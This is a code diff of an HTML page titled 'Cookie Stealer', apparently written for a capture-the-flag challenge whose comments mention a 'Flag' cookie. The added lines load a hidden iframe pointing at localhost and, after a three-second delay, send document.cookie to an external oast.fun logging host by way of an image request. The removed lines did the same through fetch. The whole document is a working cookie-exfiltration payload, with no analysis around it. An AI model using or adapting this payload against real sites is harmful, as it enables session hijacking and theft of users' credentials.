@@ -4,20 +4,13 @@
     <title>Cookie Stealer</title>
 </head>
 <body>
+    <iframe src="http://localhost/" style="display:none"></iframe>
     <script>
-        // First, redirect to localhost to get the flag cookie set
-        if (!document.cookie.includes("Flag")) {
-            // The 'fetch' below will execute first, storing our URL for later redirect back
-            fetch("http://localhost/", {
-                mode: "no-cors"
-            }).then(() => {
-                // After visiting localhost, it should have the cookie
-                // Now send the cookie to our server
-                const img = new Image();
-                img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?cookie=" + encodeURIComponent(document.cookie);
-                document.body.appendChild(img);
-            });
-        }
+        setTimeout(() => {
+            const img = new Image();
+            img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?cookie=" + encodeURIComponent(document.cookie);
+            document.body.appendChild(img);
+        }, 3000); // Wait 3 seconds for the iframe to load
     </script>
 </body>
 </html>
